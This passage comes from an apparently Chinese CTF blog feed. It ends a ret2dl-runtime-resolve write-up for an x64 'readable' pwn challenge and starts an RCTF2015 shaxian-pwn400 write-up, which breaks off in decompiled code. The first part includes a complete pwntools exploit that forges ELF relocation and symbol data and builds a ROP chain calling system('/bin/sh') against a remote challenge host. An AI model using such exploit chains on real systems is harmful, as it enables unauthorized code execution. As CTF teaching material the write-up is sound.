class="symbol">ld_2.23.so:</span>00007F3988E58F2D <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">18h</span>], <span class="built_in">rsi</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F32 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">20h</span>], <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F37 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">28h</span>], <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F3C <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">30h</span>], <span class="built_in">r9</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F41 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0EEh</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F46 <span class="keyword">xor</span>     <span class="built_in">edx</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F48 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">250h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F50 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">258h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F58 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">260h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F60 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">268h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F68 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">270h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F70 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">278h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F78 xsavec  <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">40h</span>]</span><br><span class="line"></span><br><span class="line">_dl_fixup():</span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E50A3A <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">10h</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E50C10 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">78h</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E51203 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">38h</span></span><br></pre></td></tr></table></figure></p><ul><li>2、将<code>fake数据</code>写入到<code>指定地址</code>后，还需要修改<code>.dynamic节</code>中<code>DT_VERSYM动态节类型</code>所对应的<code>动态节表项</code>中的<code>vernum表的地址</code>，使得<code>ndx = vernum + sym_index*2</code>地址处的<code>ndx值</code>为合理值。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># modify versym dynamic addr(.gnu.version) </span></span><br><span class="line"><span class="comment"># DT_VERSYM(0x40031E) - sym_index(0x155E2)*2 = 0x3D575A or 0x6006F0 - sym_index(0x155E2)*2 = 0x5D5B2C</span></span><br><span class="line"><span class="comment"># raw_input('---------[1] Before modify versym dynamic address---------')</span></span><br><span class="line">write_data_to_address(<span class="number">0x600858</span>,p64(<span class="number">0x6FFFFFF0</span>) + p64(<span class="number">0x3D575A</span>)) <span class="comment"># versym + sym_index*2 可被访问</span></span><br></pre></td></tr></table></figure><ul><li>3、构造<code>shellcode</code>，首先将<code>“/bin/sh”的地址</code>存入<code>rdi寄存器</code>，然后返回到<code>PLT0</code>处的代码，传入<code>system重定位项</code>在<code>重定位表</code>中的<code>下标</code>，利用<code>符号解析函数</code>，计算<code>system函数的地址</code>。解析完system函数的地址后，就会调用<strong><code>system(&quot;/bin/sh&quot;)</code></strong>。从而获取shell。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += p64(p_rdi_ret) + p64(binsh_str_addr)<span class="comment"># "/bin/sh"</span></span><br><span class="line">shellcode += p64(PLT0) + p64(reloc_index)</span><br><span class="line">write_data_to_address(buff_addr,shellcode)</span><br></pre></td></tr></table></figure><ul><li>4、向内存中<code>写入shellcode后</code>，还需要写入一段数据，用于<code>调整rsp</code>，使程序<code>跳转到shellcode</code>执行。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># buf--rbp--ret_address</span></span><br><span class="line">io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(buff_addr - <span class="number">0x8</span>) + p64(leave_ret))</span><br></pre></td></tr></table></figure><p><strong><code>完整exp：</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># x64</span></span><br><span class="line"><span class="comment"># Elf64_Rel *reloc = JMPREL + reloc_index*3*8</span></span><br><span class="line"><span class="comment"># Elf64_Sym *sym = &amp;SYMTAB[(reloc-&gt;r_info)&gt;&gt;0x20]</span></span><br><span class="line"><span class="comment"># i.e.  *sym = DT_SYMTAB + [(reloc-&gt;r_info)&gt;&gt;0x20]*3*8</span></span><br><span class="line"><span class="comment"># assert(((reloc-&gt;r_info)&amp;0xFFFFFFFF) == 0x7) type</span></span><br><span class="line"><span class="comment"># if((sym-&gt;st_other)&amp;3 == 0) if not resolved</span></span><br><span class="line"><span class="comment"># uint16_t ndx = VERSYM[(reloc-&gt;r_info)&gt;&gt;0x20]</span></span><br><span class="line"><span class="comment"># r_found_version *version = &amp;l-&gt;l_version[ndx]</span></span><br><span class="line"><span class="comment"># name = STRTAB + sym-&gt;st_name</span></span><br><span class="line"><span class="comment"># modify ret_addr = PLT0、the first arg = reloc_index、rdi = addr("/bin/sh")</span></span><br><span class="line"><span class="comment"># modify (jmprel + reloc_index*3*8) &lt;== fake_reloc_data</span></span><br><span class="line"><span class="comment"># modify (symtab + [(reloc-&gt;r_info)&gt;&gt;0x20]*3*8) &lt;== fake_sym_data</span></span><br><span class="line"><span class="comment"># modify (strtab + sym-&gt;st_name) &lt;== 'system\x00'</span></span><br><span class="line"><span class="comment"># modify (link_map + 0x1c8 == 0) or (versym + sym_index*2 可被访问)#第2点在64位系统中很难满足，第1点需要泄露link_map的值。</span></span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./readable'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'52.68.53.28'</span>,<span class="number">56746</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">'./readable'</span>)</span><br><span class="line">        <span class="comment"># io = gdb.debug('./readable','''bp 0x4004FD</span></span><br><span class="line">        <span class="comment">#                                bp 0x40051B''')</span></span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf64_Addr r_offset; /* 表示重定位所作用的虚拟地址或相对基地址的偏移 */ 8byte</span></span><br><span class="line"><span class="string">    Elf64_Xword r_info;  /* 重定位类型和符号表下标 */ 8byte</span></span><br><span class="line"><span class="string">    Elf64_Sxword r_addend; /* Addend */ 8byte</span></span><br><span class="line"><span class="string">&#125; Elf64_Rela;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x64_reloc_data</span><span class="params">(sym_index,got_plt)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p64(got_plt) + p64((sym_index&lt;&lt;<span class="number">0x20</span>) + <span class="number">0x07</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf64_Word    st_name;  /* 符号名，符号在字符串表中的偏移 */ 4byte</span></span><br><span class="line"><span class="string">    unsigned char st_info;  /* 符号类型及绑定属性 */ 1byte</span></span><br><span class="line"><span class="string">    unsigned char st_other; /* 符号的可见性 */ 1byte</span></span><br><span class="line"><span class="string">    Elf64_Section st_shndx; /* 节头表索引 */ 2byte</span></span><br><span class="line"><span class="string">    Elf64_Addr    st_value; /* 符号的值，可能是地址或偏移 */ 8byte</span></span><br><span class="line"><span class="string">    Elf64_Xword   st_size;  /* 符号的大小 */ 8byte</span></span><br><span class="line"><span class="string">&#125; Elf64_Sym;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x64_sym_data</span><span class="params">(name_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(name_offset) + p32(<span class="number">0x12</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">内存布局：</span></span><br><span class="line"><span class="string">0x600910 - 0x600930 Adjust buffer address</span></span><br><span class="line"><span class="string">0x600930 - 0x600940 system_got</span></span><br><span class="line"><span class="string">0x600940 - 0x600F20 0x5E0</span></span><br><span class="line"><span class="string">0x600F20 - 0x600F40 shellcode</span></span><br><span class="line"><span class="string">0x600F40 - 0x600F88 0x50</span></span><br><span class="line"><span class="string">0x600F88 - 0x600FA8 reloc_data (align 0x18) </span></span><br><span class="line"><span class="string">0x600FA8 - 0x600FB0 0x8</span></span><br><span class="line"><span class="string">0x600FB0 - 0x600FD0 sym_data (align 0x18)</span></span><br><span class="line"><span class="string">0x600FD0 - 0x600FE0 func_name("system")</span></span><br><span class="line"><span class="string">0x600FE0 - 0x600FF0 binsh_str("/bin/sh")</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">DT_JMPREL = <span class="number">0x400360</span></span><br><span class="line">DT_SYMTAB = <span class="number">0x400280</span></span><br><span class="line">DT_STRTAB = <span class="number">0x4002E0</span></span><br><span class="line">DT_VERSYM = <span class="number">0x40031E</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x600910</span></span><br><span class="line">system_got = bss_addr + <span class="number">0x20</span></span><br><span class="line">buff_addr = bss_addr + <span class="number">0x610</span></span><br><span class="line">main_addr = <span class="number">0x400505</span></span><br><span class="line">PLT0 = <span class="number">0x4003D0</span></span><br><span class="line">p_rdi_ret = <span class="number">0x400593</span></span><br><span class="line">leave_ret = <span class="number">0x400520</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reloc_data_addr(0x600F88) = DT_JMPREL(0x400360) + reloc_index(0x155D7)*3*8</span></span><br><span class="line">reloc_index = <span class="number">0x155D7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sym_data_addr(0x600FB0) = DT_SYMTAB(0x400280) + sym_index(0x155E2)*3*8  </span></span><br><span class="line">reloc_data_addr = <span class="number">0x600F88</span></span><br><span class="line">reloc_data = generate_x64_reloc_data(<span class="number">0x155E2</span>,system_got)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x600FD0) = DT_STRTAB(0x4002E0) + name_offset(0x200CF0)</span></span><br><span class="line">sym_data_addr = <span class="number">0x600FB0</span></span><br><span class="line">sym_data = generate_x64_sym_data(<span class="number">0x200CF0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x600FD0) = sym_data_addr(0x600FB0) + 0x20</span></span><br><span class="line">func_name_addr = <span class="number">0x600FD0</span></span><br><span class="line">func_name = <span class="string">"system\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binsh_str_addr(0x600FE0) = func_name_addr(0x600FD0) + 0x10</span></span><br><span class="line">binsh_str_addr = <span class="number">0x600FE0</span></span><br><span class="line">binsh_str = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_data_to_address</span><span class="params">(address,data)</span>:</span></span><br><span class="line">    length = len(data)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Data length:"</span> + str(length)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        length += <span class="number">16</span> - length % <span class="number">16</span></span><br><span class="line">    payload = data.ljust(length,<span class="string">'\x90'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Payload length:"</span> + str(length)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,length,<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># 'A'*0x10---RBP---ret_addr  buffer的地址使用RBP-0x10算出</span></span><br><span class="line">        <span class="comment"># raw_input('---------Adjust buffer address---------')</span></span><br><span class="line">        io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(address + <span class="number">0x10</span> + i) + p64(main_addr))</span><br><span class="line">        <span class="comment"># raw_input('-------------Send payload-------------')</span></span><br><span class="line">        io.send(payload[i:i+<span class="number">16</span>] + p64(bss_addr + <span class="number">0x10</span>) + p64(main_addr)) <span class="comment"># 每次只能往内存中写0x10字节数据</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="comment"># modify versym dynamic addr(.gnu.version) </span></span><br><span class="line">    <span class="comment"># DT_VERSYM(0x40031E) - sym_index(0x155E2)*2 = 0x3D575A or 0x6006F0 - sym_index(0x155E2)*2 = 0x5D5B2C</span></span><br><span class="line">    <span class="comment"># raw_input('---------[1] Before modify versym dynamic address---------')</span></span><br><span class="line">    write_data_to_address(<span class="number">0x600858</span>,p64(<span class="number">0x6FFFFFF0</span>) + p64(<span class="number">0x3D575A</span>)) <span class="comment"># versym + sym_index*2 可被访问</span></span><br><span class="line">    <span class="comment"># raw_input('---------[2] Before send reloc_data---------')</span></span><br><span class="line">    write_data_to_address(reloc_data_addr,reloc_data)</span><br><span class="line">    <span class="comment"># raw_input('---------[3] Before send sym_data---------')</span></span><br><span class="line">    write_data_to_address(sym_data_addr,sym_data)</span><br><span class="line">    <span class="comment"># raw_input('---------[4] Before send func_name---------')</span></span><br><span class="line">    write_data_to_address(func_name_addr,func_name)</span><br><span class="line">    <span class="comment"># raw_input('---------[5] Before send binsh_str---------')</span></span><br><span class="line">    write_data_to_address(binsh_str_addr,binsh_str)</span><br><span class="line"></span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p64(p_rdi_ret) + p64(binsh_str_addr)<span class="comment"># "/bin/sh"</span></span><br><span class="line">    shellcode += p64(PLT0) + p64(reloc_index)</span><br><span class="line">    write_data_to_address(buff_addr,shellcode) <span class="comment">#</span></span><br><span class="line">    <span class="comment"># raw_input('-------------Before send adjust rsp code-------------')</span></span><br><span class="line">    io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(buff_addr - <span class="number">0x8</span>) + p64(leave_ret))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><span id="Ref1">[ 01 ]：程序员的自我修养—链接、装载与库</span><br><span id="Ref2">[ 02 ]：<a href="https://blog.csdn.net/u011298001/article/details/84951584" target="_blank" rel="noopener">ELF文件系列第五篇ELF文件静态结构中的重定位项</a></span><br><span id="Ref3">[ 03 ]：<a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html" target="_blank" rel="noopener">glibc/elf/elf.h</a></span><br><span id="Ref4">[ 04 ]：<a href="https://www.cnblogs.com/vo1ad0r/p/11585025.html" target="_blank" rel="noopener">聊聊动态链接和dl_runtime_resolve</a></span><br><span id="Ref5">[ 05 ]：Linux二进制分析</span><br><span id="Ref6">[ 06 ]：<a href="https://xz.aliyun.com/t/6364" target="_blank" rel="noopener">dl-resolve浅析</a></span><br><span id="Ref7">[ 07 ]：<a href="https://bbs.ichunqiu.com/thread-44816-1-1.html" target="_blank" rel="noopener">Linux pwn入门教程(10)——针对函数重定位流程的几种攻击</a></span><br><span id="Ref8">[ 08 ]：<a href="https://blog.csdn.net/qq_36495104/article/details/106061223" target="_blank" rel="noopener">详细解析ret2_dl_runtime_resolve</a></span><br><span id="Ref9">[ 09 ]：<a href="https://docs.oracle.com/cd/E56344_01/html/E54069/chapter6-26.html" target="_blank" rel="noopener">Oracle® Solaris 11.2 链接程序和库指南</a></span><br><span id="Ref10">[ 10 ]：<a href="https://blog.csdn.net/jazrynwong/article/details/89851640" target="_blank" rel="noopener">glibc动态链接器dl_runtime_resolve简要分析</a></span><br><span id="Ref11">[ 11 ]：<a href="https://blog.csdn.net/lzshlzsh/article/details/6066628" target="_blank" rel="noopener">Linux下库函数动态链接过程分析－结合glibc-2.11源码</a></span><br><span id="Ref12">[ 12 ]：<a href="https://forum.90sec.com/t/topic/260" target="_blank" rel="noopener">ret2dl x64 &amp; x32的差异</a></span><br><span id="Ref13">[ 13 ]：<a href="https://blog.csdn.net/seaaseesa/article/details/104478081" target="_blank" rel="noopener">ret2dl-runtime-resolve详细分析(32位&amp;64位)</a></span></p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RCTF2015——WriteUp(Pwn)</title>
      <link href="/2020/07/19/RCTF2015%E2%80%94%E2%80%94WriteUp(Pwn)/"/>
      <url>/2020/07/19/RCTF2015%E2%80%94%E2%80%94WriteUp(Pwn)/</url>
      <content type="html"><![CDATA[<blockquote><p>RCTF2015 Pwn题题解<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——当你的才华还配不上你的野心时，请静下来好好努力！<br><a id="more"></a></p></blockquote><h2 id="shaxian-pwn400"><a href="#shaxian-pwn400" class="headerlink" title="shaxian-pwn400"></a>shaxian-pwn400</h2><h3 id="0x00-检查程序开启的保护机制"><a href="#0x00-检查程序开启的保护机制" class="headerlink" title="0x00 检查程序开启的保护机制"></a>0x00 检查程序开启的保护机制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec shaxian</span><br><span class="line">[*] &apos;/home//Desktop/remote-dbg/shaxian&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我们可以看到程序开启了<code>Partial RELRO</code>(部分重定位只读)，在这种情况下，<code>.dynamic段</code>是不可写的，<code>.got.plt段</code>(GOT表)是可写的。又开启了<code>Canary</code>检测是否有栈溢出，开启了<code>NX(DEP)</code>使堆栈上的代码不可执行。</p><h3 id="0x10-静态分析"><a href="#0x10-静态分析" class="headerlink" title="0x10 静态分析"></a>0x10 静态分析</h3><p>&emsp;&emsp;这是一个<code>32位</code>的<code>ELF</code>程序，我们通过IDA的反汇编功能对其反汇编并对函数名和变量名重命名后，<code>主函数</code>伪代码如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choose; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">30u</span>);                                   <span class="comment">// 30秒的闹钟</span></span><br><span class="line">  close_buffer();</span><br><span class="line">  banner();</span><br><span class="line">  input_your_message();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts_menu();</span><br><span class="line">    choose = get_num();</span><br><span class="line">    <span class="keyword">if</span> ( choose == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( choose )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Diancai();                              <span class="comment">// 1、点菜</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        Submit();                               <span class="comment">// 2、提交订单</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        Receipt();                              <span class="comment">// 3、收据信息</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        Review();                               <span class="comment">// 4、回顾</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:                                   <span class="comment">// 5、退出</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice!"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">input_your_message</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your Address:"</span>);</span><br><span class="line">  input_message(<span class="number">0</span>, (<span class="keyword">int</span>)&amp;Address_buf, <span class="number">256</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your Phone number:"</span>);</span><br><span class="line">  input_message(<span class="number">0</span>, (<span class="keyword">int</span>)&amp;Phone_number_buf, <span class="number">256</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Thank you."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">puts_menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1.WO YAO DIAN CAI"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2.Submit"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3.I want Receipt"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4.Review"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"5.Exit"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"choose:"</span>);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span 